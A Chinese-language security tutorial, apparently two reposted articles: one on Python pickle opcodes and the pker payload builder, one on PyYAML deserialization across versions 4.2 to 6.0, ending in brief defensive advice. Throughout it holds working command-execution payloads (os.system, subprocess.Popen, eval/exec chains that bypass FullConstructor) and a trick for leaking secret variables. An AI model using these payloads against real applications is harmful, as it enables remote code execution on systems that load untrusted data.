# python反序列化

转载

* 可序列化的对象

- `None` 、 `True` 和 `False`
- 整数、浮点数、复数
- str、byte、bytearray
- 只包含可封存对象的集合，包括 tuple、list、set 和 dict
- 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）
- 定义在模块最外层的内置函数
- 定义在模块最外层的类
- `__dict__` 属性值或 `__getstate__()` 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）

opcode表

| opcode | 描述                                                         | 具体写法                                           | 栈上的变化                                                   | memo上的变化 |
| ------ | ------------------------------------------------------------ | -------------------------------------------------- | ------------------------------------------------------------ | ------------ |
| c      | 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包） | c[module]\n[instance]\n                            | 获得的对象入栈                                               | 无           |
| o      | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） | o                                                  | 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 | 无           |
| i      | 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） | i[module]\n[callable]\n                            | 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 | 无           |
| N      | 实例化一个None                                               | N                                                  | 获得的对象入栈                                               | 无           |
| S      | 实例化一个字符串对象                                         | S'xxx'\n（也可以使用双引号、\'等python字符串形式） | 获得的对象入栈                                               | 无           |
| V      | 实例化一个UNICODE字符串对象                                  | Vxxx\n                                             | 获得的对象入栈                                               | 无           |
| I      | 实例化一个int对象                                            | Ixxx\n                                             | 获得的对象入栈                                               | 无           |
| F      | 实例化一个float对象                                          | Fx.x\n                                             | 获得的对象入栈                                               | 无           |
| R      | 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 | R                                                  | 函数和参数出栈，函数的返回值入栈                             | 无           |
| .      | 程序结束，栈顶的一个元素作为pickle.loads()的返回值           | .                                                  | 无                                                           | 无           |
| (      | 向栈中压入一个MARK标记                                       | (                                                  | MARK标记入栈                                                 | 无           |
| t      | 寻找栈中的上一个MARK，并组合之间的数据为元组                 | t                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| )      | 向栈中直接压入一个空元组                                     | )                                                  | 空元组入栈                                                   | 无           |
| l      | 寻找栈中的上一个MARK，并组合之间的数据为列表                 | l                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| ]      | 向栈中直接压入一个空列表                                     | ]                                                  | 空列表入栈                                                   | 无           |
| d      | 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） | d                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| }      | 向栈中直接压入一个空字典                                     | }                                                  | 空字典入栈                                                   | 无           |
| p      | 将栈顶对象储存至memo_n                                       | pn\n                                               | 无                                                           | 对象被储存   |
| g      | 将memo_n的对象压栈                                           | gn\n                                               | 对象被压栈                                                   | 无           |
| 0      | 丢弃栈顶对象                                                 | 0                                                  | 栈顶对象被丢弃                                               | 无           |
| b      | 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 | b                                                  | 栈上第一个元素出栈                                           | 无           |
| s      | 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 | s                                                  | 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 | 无           |
| u      | 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 | u                                                  | MARK标记以及被组合的数据出栈，字典被更新                     | 无           |
| a      | 将栈的第一个元素append到第二个元素(列表)中                   | a                                                  | 栈顶元素出栈，第二个元素（列表）被更新                       | 无           |
| e      | 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 | e                                                  | MARK标记以及被组合的数据出栈，列表被更新                     | 无           |

### pker能做的事

引用自https://xz.aliyun.com/t/7012#toc-5：

> - 变量赋值：存到memo中，保存memo下标和变量名即可
> - 函数调用
> - 类型字面量构造
> - list和dict成员修改
> - 对象成员变量修改

具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。

### 使用方法与示例

1. pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）
2. 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。
3. pker主要用到`GLOBAL、INST、OBJ`三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：

```
以下module都可以是包含`.`的子module
调用函数时，注意传入的参数类型要和示例一致
对应的opcode会被生成，但并不与pker代码相互等价

GLOBAL
对应opcode：b'c'
获取module下的一个全局对象（没有import的也可以，比如下面的os）：
GLOBAL('os', 'system')
输入：module,instance(callable、module都是instance)  

INST
对应opcode：b'i'
建立并入栈一个对象（可以执行一个函数）：
INST('os', 'system', 'ls')  
输入：module,callable,para 

OBJ
对应opcode：b'o'
建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
OBJ(GLOBAL('os', 'system'), 'ls') 
输入：callable,para

xxx(xx,...)
对应opcode：b'R'
使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[0]=321
或
globals_dic['local_var']='hello'
对应opcode：b's'
更新列表或字典的某项的值

xx.attr=123
对应opcode：b'b'
对xx对象进行属性设置

return
对应opcode：b'0'
出栈（作为pickle.loads函数的返回值）：
return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
```

注意：

1. 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。
2. pker解析`S`时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:

```
test="123"
return test
```

被解析为：

```
b"S'123'\np0\n0g0\n."
```

#### pker：全局变量覆盖

- 覆盖直接由执行文件引入的`secret`模块中的`name`与`category`变量：

```
secret=GLOBAL('__main__', 'secret') 
# python的执行文件被解析为__main__对象，secret在该对象从属下
secret.name='1'
secret.category='2'
```

- 覆盖引入模块的变量：

```
game = GLOBAL('guess_game', 'game')
game.curr_ticket = '123'
```

接下来会给出一些具体的基本操作的实例。

#### pker：函数执行

- 通过`b'R'`调用：

```
s='whoami'
system = GLOBAL('os', 'system')
system(s) # `b'R'`调用
return
```

- 通过`b'i'`调用：

```
INST('os', 'system', 'whoami')
```

- 通过`b'c'`与`b'o'`调用：

```
OBJ(GLOBAL('os', 'system'), 'whoami')
```

- 多参数调用函数

```
INST('[module]', '[callable]'[, par0,par1...])
OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...])
```

#### pker：实例化对象

- 实例化对象是一种特殊的函数执行

```
animal = INST('__main__', 'Animal','1','2')
return animal


# 或者

animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
return animal
```

- 其中，python原文件中包含：

```
class Animal:

    def __init__(self, name, category):
        self.name = name
        self.category = category
```

- 也可以先实例化再赋值：

```
animal = INST('__main__', 'Animal')
animal.name='1'
animal.category='2'
return animal
```

#### 手动辅助

- 拼接opcode：将第一个pickle流结尾表示结束的`.`去掉，两者拼接起来即可。
- 建立普通的类时，可以先pickle.dumps，再拼接至payload。



SecMap - 反序列化（PyYAML）

## 基础知识

这里简单说一下 YAML 支持的基础语法，若想更加深入了解语法规则，请移步 Google 搜索。

### 基础语法规则

基础语法规则有以下几种：

1. 一个 .yml 文件中可以有多份配置文件，用 `---` 隔开即可
2. 对大小写敏感
3. YAML 中的值，可使用 json 格式的数据
4. 使用缩进表示层级关系
5. 缩进时不允许使用 tab（`\t`），只允许使用空格。
6. 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可。
7. `#` 表示注释，和 Python 一样
8. `!!` 表示强制类型装换
9. 可以通过 `&` 来定义锚点，使用 `*` 来引用锚点。`*` 也可以和 `<<` 配合，引用时会自动展开对象，类似 Python 的 `**dict()`
10. YAML 支持的数据结构有三种
    1. 对象：键值对的集合
    2. 列表：一组按次序排列的值
    3. 标量（scalars）：原子值（不可再拆分），例如 数字、日期等等

下面通过 YAML 内容与 PyYAML 解析之后的结果对比，可以清晰地了解 YAML 到底配置了啥：

```
import yaml

yaml.load('''

string_0:
    - macr0phag3
    - "I'm Tr0y"  # 可以使用双引号或者单引号包裹特殊字符
    - "I am fine. \u263A" # 使用双引号包裹时支持 Unicode 编码
    - "\\x0d\\x0a is \\r\\n" # 使用双引号包裹时还支持 Hex 编码
    - newline
      newline2  # 字符串可以拆成多行，每行之间用空格隔开

# > 可以在字符串中折叠换行
string_1: >
    newline
    newline2

# | 保留换行符
string_2: |
    newline
    newline2

# | 保留换行符，且去掉最后一个换行符
string_3: |-
    newline
    newline2

list: &id_1
- 18  # 定义锚点
- cm

two_dimensional_list:
-
    - Macr0phag3
    - Tr0y

boolean: 
    - TRUE  # true、True、Yes、YES、yes、ON、on、On 都可以
    - FALSE  # false、False、NO、no、No、off、OFF、Off 都可以

float:
    - 3.14
    - 6.8523015e+5  # 可以使用科学计数法

int:
    - 123
    - 0b10100111010010101110  # 支持二进制表示
    - 0x0a  # 支持十六进制表示

nulls:
  - null  # NULL 也 ok
  - Null
  - ~
  -

date:
    - 2018-02-17  # 日期必须使用 ISO 8601 格式，即 yyyy-MM-dd

datetime: 
    -  2018-02-17T15:02:31+08:00  # 时间使用 ISO 8601 格式，时间和日期之间使用 T 连接，最后使用 + 代表时区

# > 可以在字符串中折叠换行
object: &id_2
    name: Tr0y
    money: 0

json: [{1: Macr0phag3, 2: Tr0y}, "???"]  # 值支持 json

reference: 
    size: *id_1
    <<: *id_2

''')

PY
```

结果如下：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8d42331c-e3bd-4620-af91-f6c797f8117e.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8d42331c-e3bd-4620-af91-f6c797f8117e.png!blog)

~~（内含彩蛋）~~

对于 PyYAML 的使用，请移步官方文档：

https://pyyaml.org/wiki/PyYAMLDocumentation

## 类型转换

上面还差一个重要的语法没讲：可以通过 `!!` 来进行类型转换。

通过上面的测试可以发现，如果识别到一个数字，那么按照 YAML 格式来处理，这个类型就是数字类型。如果我们想把数字类型变为字符串类型就可以这样：`a: !!str 1`，它的结果和 `a: "1"` 是一样的。

由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 `!!` 来扩展额外的解析能力。本文主要聚焦于 PyYAML，所以直接看源码就可以知道它在 `!!` 上做了哪些魔改。

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8dbaf2fa-14ae-4c61-aac4-af1c0a04fd5c.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8dbaf2fa-14ae-4c61-aac4-af1c0a04fd5c.png!blog)

### 理解基础的类型转换

在 `site-packages/yaml/constructor.py` 中可以看到使用了 `add_constructor` 的有 24 多个地方，这些都是用来支持基础的类型转换（带有 `tag:yaml.org,2002:python/` 的说明是 PyYAML 自定义的类型转换），这些基础类型转换的功能非常好理解，看上面那张图即可，就不多说了，来看下它是怎么实现的吧。

以 `!!binary` 这个为例，对应的函数是 `construct_yaml_binary`，下个断点可以看到，传入的参数 node 格式为：

```
ScalarNode(
  tag='tag:yaml.org,2002:binary',
  value='R0lGODlhDAAMAIQAAP//9/X\n17unp5WZmZgAAAOfn515eXv\nPz7Y6OjuDg4J+fn5OTk6enp\n56enmleECcgggoBADs=mZmE'
)

PY
```


所以对于一个 `!!x x` 来说，类型转换执行的伪代码就是：`find_function("x")(x)`。这个也很好理解。



### 高级类型转换

在理解了基础的类型转换之后，查看源码可以发现还有一个 `add_multi_constructor` 函数，一共有 5 个：

- `python/name`
- `python/module`
- `python/object`
- `python/object/new`
- `python/object/apply`

从上面那张图可以看到，这几个都可以引入新的模块。这就是 PyYAML 存在反序列化的本质原因。

## 攻击思路

截止目前（2022），PyYAML 的利用划分以版本 5.1 为界限，<5.1 版本的利用非常简单，就先介绍一下；>5.1 的利用很相似，但需要稍微做一些解释，所以放在后面。

下面按照利用难度从易到难排列。

### 版本小于 5.1

下面以 `4.2b4` 为例。

#### 关键方法

<5.1 版本中提供了几个方法用于解析 YAML：

1. `yaml.load`：加载单个 YAML 配置
2. `yaml.load_all`：加载多个 YAML 配置

以上这两种均可以通过 `Loader` 参数来指定加载器。一共有三个加载器，加载器后面对应了三个不同的构造器：

1. `BaseConstructor`：最最基础的构造器，不支持强制类型转换
2. `SafeConstructor`：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改
3. `Constructor`：在 YAML 规范上新增了很多强制类型转换

`Constructor` 这个是最危险的构造器，却是默认使用的构造器。

#### python/object/apply

对应的函数是 `construct_python_object_apply`，最终在 `make_python_instance` 中引入了模块中的方法并执行。

`python/object/apply` 要求参数必须用一个列表的形式提供，所以以下 payload 都是等价的，但是写法不一样，可以用来绕过：

```
yaml.load('exp: !!python/object/apply:os.system ["whoami"]')

yaml.load("exp: !!python/object/apply:os.system ['whoami']")

# 引号当然不是必须的
yaml.load("exp: !!python/object/apply:os.system [whoami]")

yaml.load("""
exp: !!python/object/apply:os.system
- whoami
""")

yaml.load("""
exp: !!python/object/apply:os.system
  args: ["whoami"]
""")

# command 是 os.system 的参数名
yaml.load("""
exp: !!python/object/apply:os.system
  kwds: {"command": "whoami"}
""")

yaml.load("!!python/object/apply:os.system [whoami]: exp")

yaml.load("!!python/object/apply:os.system [whoami]")

yaml.load("""
!!python/object/apply:os.system
- whoami
""")

PY
```



#### python/object/new

对应的函数是 `construct_python_object_new`，这个函数仅有一行，就是调用 `construct_python_object_apply`，他们两个链路的区别在于调用 `make_python_instance` 时 `newobj` 参数不同。

而仔细观察 `make_python_instance` 中的 `if newobj and isinstance(cls, type)` 条件基本上都会满足（有例外，后面那个条件有点特殊的地方，下面会细说）。所以 `python/object/new` 和 `python/object/apply` 可以视为是完全等价的，那么它们的 payload 就是一样的，参考上面即可。

#### python/object

对应的函数是 `construct_python_object`，非常简单，先 `make_python_instance` 了一下，然后执行了 `set_python_instance_state`。根据上面的经验，只要走到 `make_python_instance` 就可以触发调用。但问题是这里没法传参，所以只能执行无参函数：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e46d6374-5b1d-496b-8226-9ae96eae7205.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e46d6374-5b1d-496b-8226-9ae96eae7205.png!blog)

有趣的是，这种利用方式会报错：`TypeError: can't set attributes of built-in/extension type 'object'`，通过分析代码可知，流程是走到了 `setattr(object, key, value)` 报错的：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e69c4ea6-e8bd-4fce-b8c2-1dcd202b9eeb.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e69c4ea6-e8bd-4fce-b8c2-1dcd202b9eeb.png!blog)

这个是必然的，object 这种内置的类，都是在底层的 C 代码中写死的，官方不允许对它们随便设置属性的。这里顺便说一句，通过 gc 引用是可以修改的：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/bc3913c2-af44-4094-8f66-7b122787151d.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/bc3913c2-af44-4094-8f66-7b122787151d.png!blog)

当然这个不是本文重点。

所以这很明显是一个 bug，因为这个流程既然存在就必定会走到，而现在一旦走到就必然报错。查了下 issue，发现在 18 年的时候就已经发现了：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/c4647a3e-2d2b-4604-8113-6fc798175a93.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/c4647a3e-2d2b-4604-8113-6fc798175a93.png!blog)

的确，应该是 `setattr(instance, key, value)`。这个 bug 在 5.3 已修复了。

#### python/module

对应的函数是 `construct_python_module`，里面调用了 `find_python_module`，等价于 `import`。

那么在这种没有调用逻辑的情况下，是否有办法利用呢？我感觉在可以写任意文件的时候是有办法的。比如搭配任意文件上传。

首先写入执行目录，yaml 中指定同名模块，例如上传一段恶意代码，叫 `exp.py`，然后通过 `yaml.load('!!python/module:exp')` 加载。

在实际的场景中，由于一般用于存放上传文件的目录和执行目录并不是同一个，例如：

```
app.py
uploads
  |_ user.png
  |_ header.jpg

1C
```

这个时候只需要上传一个 .py 文件，这个文件会被放在 uploads 下，这时只需要触发 `import uploads.header` 就可以利用了：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/a2aa2bd6-27cc-4d0c-aa6a-4b894ae35514.png!blog#width-zoom6)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/a2aa2bd6-27cc-4d0c-aa6a-4b894ae35514.png!blog#width-zoom6)

更简单的，直接上传 `__init__.py`，在触发的时候用 `!!python/module:uploads` 就可以了。

#### python/name

对应的函数是 `construct_python_name`，里面调用了 `find_python_name`，与 `python/module` 的逻辑极其类似，区别在于，`python/module` 仅仅返回模块而 `python/name` 返回的是模块下面的属性/方法。

利用的逻辑除了上面一样之外，还可以用于这种场景：

```
import yaml


TOKEN = "Y0u_Nev3r_kn0w."

def check(config):
    try:
        token = yaml.load(config).get("token", None)
    except Exception:
        token = None

    if token == TOKEN:
        print("yes, master.")
    else:
        print("fuck off!")


config = ''  # 可控输入点
check(config)

PY
```

这个时候的 payload 为 `token: !!python/name:__main__.TOKEN`，无需知道 TOKEN 是什么，但是需要知道变量名。

当然，这个场景除了 `!!python/module` 无法完成利用之外，上述其他姿势都可以实现。

### 版本大于等于 5.1

由于默认的构造器太过强大，开发人员不了解这些危险很容易中招。所以 PyYAML 的开发者就将构造器分为：

1. `BaseConstructor`：没有任何强制类型转换
2. `SafeConstructor`：只有基础类型的强制类型转换
3. `FullConstructor`：除了 `python/object/apply` 之外都支持，但是加载的模块必须位于 `sys.modules` 中（说明已经主动 import 过了才让加载）。这个是默认的构造器。
4. `UnsafeConstructor`：支持全部的强制类型转换
5. `Constructor`：等同于 `UnsafeConstructor`

对应顶层的方法新增了：

1. `yaml.full_load`
2. `yaml.full_load_all`
3. `yaml.unsafe_load`
4. `yaml.unsafe_load_all`

通常情况下，我们还是会使用 `yaml.load`，这个时候会有 warning：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/74750255-05b5-44fe-89fa-56f84fff1b78.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/74750255-05b5-44fe-89fa-56f84fff1b78.png!blog)

因为在不指定 `Loader` 的时候，默认是 `FullConstructor` 构造器。这对开发人员起到了提醒的作用。

除此之外，在 `make_python_instance` 还新增的额外的限制：`if not (unsafe or isinstance(cls, type))`，也就是说，在安全模式下，加载进来的 `module.name` 必须是一个类（例如 `int`、`str` 之类的），否则就会报错。

### 常规利用方式

常规的利用方式和 <5.1 版本的姿势是一样的。当然前提是构造器必须用的是 `UnsafeConstructor` 或者 `Constructor`，也就是这种情况：

1. `yaml.unsafe_load(exp)`
2. `yaml.unsafe_load_all(exp)`
3. `yaml.load(exp, Loader=UnsafeLoader)`
4. `yaml.load(exp, Loader=Loader)`
5. `yaml.load_all(exp, Loader=UnsafeLoader)`
6. `yaml.load_all(exp, Loader=Loader)`

直接打就好了。

### 突破 FullConstructor

FullConstructor 中，限制了只允许加载 `sys.modules` 中的模块。这个有办法突破吗？我们先列举一下限制：

1. 只引用，不执行的限制：
   1. 加载进来的 `module` 必须是位于 `sys.modules` 中
2. 引用并执行：
   1. 加载进来的 `module` 必须是位于 `sys.modules` 中
   2. FullConstructor 下，`unsafe = False`，加载进来的 `module.name` 必须是一个类

举两个不行的例子：

1. `!!python/name:pickle.loads`：`pickle` 不在 `sys.modules` 中
2. `!!python/object/new:builtins.eval ["print(1)"]`：`eval` 虽然在 `sys.modules` 中，但是 `type(builtins.eval)` 是 `builtin_function_or_method` 而不是一个类。

那么最直接的思路就是，有没有一个模块，它在 FullConstructor 上下文中的 `sys.modules` 里，同时它还有一个类，这个类可以执行命令？答案就是 `subprocess.Popen`。所以最简单的 payload 就是：

```
yaml.load("""
!!python/object/apply:subprocess.Popen
  - whoami
""")

PY
```



不用 `!!python/object/apply` 的话，也有其他办法。

通过遍历 builtins 下的所有方法，可以找到这些看起来有点用的：

```
bool、bytearray、bytes
complex
dict
enumerate
filter、float、frozenset
int
list
map、memoryview
object
range、reversed
set、slice、str、staticmethod
tuple
zip

PYTHON
```



其中，`map` 是可以用来触发函数执行的，那么函数怎么引用进来呢？很明显就是 `python/name`，所以这个 payload 的原型就可以是：

```
tuple(map(eval, ["__import__('os').system('whoami')"]))

PY
```



翻译为 YAML 即为：

```
yaml.load("""
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').system('whoami')"]
""")

PY
```



这里有个非常有趣的地方，如果把 `tuple` 换成 `list` 或者是 `set`，理论上同样会解开 map 里的内容：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/342671db-24bb-431c-9a4e-2ce809fc71b6.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/342671db-24bb-431c-9a4e-2ce809fc71b6.png!blog)

但是通过 `!!python/object/new` 来使用时却会忽略参数，生成一个空的迭代对象：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/dae3bf71-db1c-4962-aea3-195cbc1f5dd8.png!blog#width-zoom5)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/dae3bf71-db1c-4962-aea3-195cbc1f5dd8.png!blog#width-zoom5)

可以看到，上面并没有执行命令（只要尝试解开 payload 里的 map 必定会执行命令）。跟踪执行流程并审计源码可以发现，在 `make_python_instance` 中，这也是为什么我上面说这个条件比较特殊。

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/d8f60d96-f82d-4b91-9b12-735abbbc475b.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/d8f60d96-f82d-4b91-9b12-735abbbc475b.png!blog)

可以看到，这里是通过 `cls.__new__` 来新建一个 cls 实例的，因为 FullConstructor 下使用 `python/object/new` 时，newobj 必定是 `True`，而后面那个条件必定是满足的，否则上面一个条件就会报错。

所以到这里我们就可以复现这个 “bug”：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/58f754f0-a23c-4913-a8dc-ee57f64f3ebc.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/58f754f0-a23c-4913-a8dc-ee57f64f3ebc.png!blog)

那么为什么通过 `list.__new__` 会忽略元素参数，而 `tuple.__new__` 却不会呢？

通过审计 Python 的 C 代码，对比 list 和 tuple 的底层实现，大致可以得出这么一个结论：由于 `__new__` 的调用在 `__init__` 之前，所以我猜测不可变类型是在 `__new__` 时插入元素，而可变类型是在 `__init__` 时插入元素，所以 `__new__` 时传入的元素参数就被忽略了，而 `__init__` 又没有接收到元素，所以就生成了一个空的实例。**注意，这个结论由于精力原因，并没有经过严格的考证，若感兴趣橘友们应当自行跟踪调试。**

所以 `frozenset`、`bytes` 等这种不可变类型都会解开里面的元素从而触发命令执行，而 `dict`、`bytearray` 等这种可变类型就不会：

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/70d23eee-bddc-4ab3-a0a5-a7acfe5932c2.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/70d23eee-bddc-4ab3-a0a5-a7acfe5932c2.png!blog)

所以，我们只需要找到 触发带参调用 + 引入函数 这两个点就可以完成攻击。在 `construct_python_object_apply` 中，不仅进行了实例化，如果有 `listitems` 还会调用实例的 `extend` 方法，所以原型是：

```
exp = type("exp", (,), {"extend": eval})
exp.extend("__import__('os').system('whoami')")

PY
```



YAML payload:

```
yaml.full_load("""
!!python/object/new:type
args:
  - exp
  - !!python/tuple []
  - {"extend": !!python/name:exec }
listitems: "__import__('os').system('whoami')"
""")

PY
```



结果：
[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/11e9e1a9-eb9c-4cbf-a5b7-b18feef4e286.png!blog#width-zoom7)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/11e9e1a9-eb9c-4cbf-a5b7-b18feef4e286.png!blog#width-zoom7)

`construct_python_object_apply` 中还对实例进行 setstate，即调用了 `__setstate__`，所以同样的思路，原型：

```
exp = type("exp", (list, ), {"__setstate__": eval})
exp.__setstate__("__import__('os').system('whoami')")

PY
```



YAML payload:

```
yaml.full_load("""
!!python/object/new:type
args:
  - exp
  - !!python/tuple []
  - {"__setstate__": !!python/name:eval }
state: "__import__('os').system('whoami')"
""")

PY
```



这里的 `type` 也可以用 `staticmethod` 来替换。例如，在 `set_python_instance_state` 中，还有个调用 `slotstate.update` 的逻辑，那么只要将 `slotstate.update` 置为 `eval`，`state` 就是 RCE 的 payload。原型：

```
exp = staticmethod([0])
exp.__dict__.update(
    {"update": eval, "items": list}
)
exp_raise = str()
# 由于 str 没有 __dict__ 方法，所以在 PyYAML 解析时会触发下面调用

exp.update("__import__('os').system('whoami')")

PY
```

YAML payload:

```
yaml.full_load("""
!!python/object/new:str
    args: []
    # 通过 state 触发调用
    state: !!python/tuple
      - "__import__('os').system('whoami')"
      # 下面构造 exp
      - !!python/object/new:staticmethod
        args: []
        state: 
          update: !!python/name:eval
          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功
""")

PY
```



这个稍微复杂一些。

总之这个组合拳用来绕过 FullConstructor 是很简单的。

### 版本大于等于 5.2

FullConstructor 现在只额外支持 `!!python/name`、`!!python/object`、`!!python/object/new` 和 `!!python/module`，`!!python/object/apply` G 了。

### 版本大于等于 5.3.1

> 2022.6.29 本文更新

5.3.1 引入了一个新的过滤机制，本质上就是实现一个属性名黑名单（正则），匹配到就报错。

[![img](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/20220629170947.png!blog)](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/20220629170947.png!blog)

见：https://github.com/yaml/pyyaml/pull/386

简单，粗暴。

### 版本大于等于 5.4

> 2022.6.29 本文更新

FullConstructor 现在只额外支持 `!!python/name`，`!!python/object/apply`、`!!python/object`、`!!python/object/new` 和 `!!python/module` 都 G 了。

### 版本大于等于 6.0

> 2022.6.29 本文更新

现在在使用 `yaml.load` 时，用户必须指定 Loader。这个改进其实有点强硬，所以引发了一堆 issue，还有人在直接开怼认为这是糟糕的设计。但是至少安全性上来说，相比给一个告警，确实得到了一定提升。

issue 见：https://github.com/yaml/pyyaml/issues/576

## 防御

我感觉大多数时候没必要使用如此灵活的解析，所以作为研发，可以尽量使用 `yaml.safe_load` 来做解析，这一点没啥可说的。

写完这一切之后，我在官方 issue 中看到了关于 >5.1 的 `yaml.full_load` 安全问题的讨论，这个是默认方法却存在漏洞。作为安全人员，我的观点是官方提供的默认方法应该是安全的，即使牺牲了部分功能。如果一定需要使用那些不太安全的功能也可以，但是需要主动开启（例如加额外的参数，或者换方法名），否则大多数人都会使用 full_load，毕竟是默认的方法。我感觉打印警告起到的作用还是稍微弱了一些。



------

